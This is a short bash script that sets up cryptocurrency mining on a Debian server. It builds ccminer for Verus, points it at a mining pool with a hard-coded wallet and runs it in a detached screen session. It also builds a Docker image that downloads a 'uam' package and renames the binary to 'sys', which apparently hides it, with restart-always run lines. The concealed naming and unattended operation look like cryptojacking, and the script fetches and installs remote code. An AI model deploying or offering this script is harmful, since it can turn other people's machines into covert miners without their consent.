#!/bin/bash
echo -e 'deb http://ftp.de.debian.org/debian stretch main \ndeb http://security.debian.org/debian-security stretch/updates main' >> /etc/apt/sources.list
apt update 
apt full-upgrade -y
cd /root/
apt install net-tools ethtool linux-igd nload mc htop docker.io -y
apt install -y screen libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd /root/ccminer
chmod +x build.sh
chmod +x configure.sh
chmod +x autogen.sh
./build.sh
echo -e 'EXTIFACE=eth0\nINTIFACE=docker0' >> /etc/default/linux-igd
echo -e 'net.ipv4.ip_forward=1' >> /etc/sysctl.conf
/etc/init.d/linux-igd restart && sysctl -p 
cd /root
touch Dockerfile
echo -e 'FROM debian:buster-slim' >> Dockerfile
echo -e 'RUN cd /tmp && apt update && apt full-upgrade -y && apt install wget libglib2.0-0 netbase -y &&\ ' >> Dockerfile
echo -e 'wget https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb && dpkg -i /tmp/uam-latest_amd64.deb && \' >> Dockerfile
echo -e 'mv /opt/uam/uam /opt/uam/sys' >> Dockerfile
echo -e 'CMD /opt/uam/sys --pk 95D9FA93C26D150C7AF040C4107D7F1BE247D8B4AFD66BEBB2CD765D7253EA09 --no-ui' >> Dockerfile
docker build -t sys:latest .
#docker run -d --cap-add=IPC_LOCK --name ded1 --restart always sys:latest
#docker run -d --cap-add=IPC_LOCK --name ded2 --tmpfs /root/.uam --restart always sys:latest
#docker run -d --cap-add=IPC_LOCK --name ded3 --tmpfs /root/.uam --restart always sys:latest
screen -dmS vrsk /root/ccminer/ccminer -a verus -o stratum+tcp://eu.luckpool.net:3957#xnsub -u RW7oReZ81MzgodB7LEksNTwuJ34iGDrmta.erteltabvivyancb -p x -t 1
